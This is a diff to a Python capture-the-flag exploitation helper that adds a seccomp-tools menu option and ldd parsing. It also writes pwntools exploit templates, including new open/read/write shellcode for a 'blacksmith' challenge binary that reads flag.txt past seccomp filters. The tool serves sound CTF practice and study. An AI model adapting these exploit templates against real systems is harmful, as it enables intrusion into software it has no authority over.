@@ -256,7 +256,7 @@ def options():
       print(colored(FUNC[13],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) GOTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52)               " + '\u2551',end=' ')
+   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) GOTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecComp  Tools" + '\u2551',end=' ')
    if "main" in FUNC[14]:
       print(colored(FUNC[14],colour3), end=' ')
    else:
@@ -1232,9 +1232,17 @@ while True:
                if "MSB" in binary:
                   IND = "big"
                   print(IND + " indian...")
-                  DATA[6] = spacePadding(IND, COL1)              
+                  DATA[6] = spacePadding(IND, COL1)
+               if "not stripped" in binary:
+                  print("Debugging information built in...")
+               else:
+                  if "stripped" in binary:
+                     print("Debugging information removed...")
                if "dynamically linked" in binary:
                   command("ldd " + localDir + "/" + DATA[0].rstrip(" ") + " > libc.tmp")
+                  command("cat libc.tmp | awk '{ sub(/^[ \t]+/, \"\"); print }' > libs.tmp")
+                  parsFile("libs.tmp")                  
+                  catsFile("libs.tmp")
                   command("cat libc.tmp | grep '=>' > address.tmp")
                   with open("address.tmp","r") as address:
                      lib = address.readline()
@@ -1244,12 +1252,7 @@ while True:
                      liba = liba.replace("(","")
                      liba = liba.replace(")","")
                      REG2[11] = spacePadding(liba, COL1)
-                     print("Dynamic link to " + DATA[7].rstrip(" ") + " at address " + REG2[11].rstrip(" ") + "...")              
-               if "not stripped" in binary:
-                  print("Debugging information built in...")
-               else:
-                  if "stripped" in binary:
-                     print("Debugging information removed...")
+                     print("Dynamic link to " + DATA[7].rstrip(" ") + " at address " + REG2[11].rstrip(" ") + "...")
                if "intel" in binary:
                   print("Consider switching the disassembly style to intel - 'set disassembly-flavor intel'...")
                if "aarch64" in binary:
@@ -1838,7 +1841,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Hex Editor.
+# Details : Menu option selected - Hex Editor. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1849,6 +1852,21 @@ while True:
          print(colored("[*] Editing filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
          command("ghex " + localDir + "/" + DATA[0].rstrip(" "))
       prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : FULL STACK
+# Details : Menu option selected - seccomp-tools dump file.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '52':
+      if DATA[0][:7].upper() == "UNKNOWN":
+         print("[-] Filename not specified...")
+      else:
+         command("seccomp-tools dump " + localDir + "/" + DATA[0])
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1965,10 +1983,8 @@ while True:
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
          
          if DATA[1][:3] == "elf":
-            command("echo 'elf  = ELF(\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
-            command("echo '# context.binary = \"./" + DATA[0].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER
-            
+            command("echo 'exe  = (\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
+            command("echo 'elf  = context.binary = ELF(exe,checksec=False)' >> " + localDir + "/exploit.py")           
             command("echo 'rop  = ROP(elf.path)' >> " + localDir + "/exploit.py")
             command("echo 'libc = ELF(\"" + LIBC.rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
             command("echo 'info(rop.dump())' >> " + localDir + "/exploit.py")
@@ -2088,8 +2104,24 @@ while True:
             command("echo 's.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
             command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendline(\"flag\")' >> " + localDir + "/exploit.py")
-            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")         
-         
+            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")     
+            
+         if DATA[0][:10] == "blacksmith":
+            command("echo 'payload  = asm(shellcraft.open(\"flag.txt\"))' >> "  + localDir + "/exploit.py")
+            command("echo 'payload += asm(shellcraft.read(3, \"rsp\", 0x100)) # read to rsp' >> "  + localDir + "/exploit.py")
+            command("echo 'payload += asm(shellcraft.write(1, \"rsp\", \"rax\"))  # write rsp  ' >> "  + localDir + "/exploit.py")
+
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER            		
+            command("echo 's.sendlineafter(\">\", \"1\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\">\", \"2\")' >> " + localDir + "/exploit.py")           
+            command("echo 's.sendlineafter(\">\", flat(payload))' >> " + localDir + "/exploit.py")
+
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER 
+            command("echo 's.recv()' >> " + localDir + "/exploit.py")
+            command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
+            command("echo 'print(terminater, flag)' >> " + localDir + "/exploit.py")
+            command("echo 'exit(1)' >> " + localDir + "/exploit.py")
+            
 # ADD YOUR BESPOKE PAYLOAD HERE
          
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
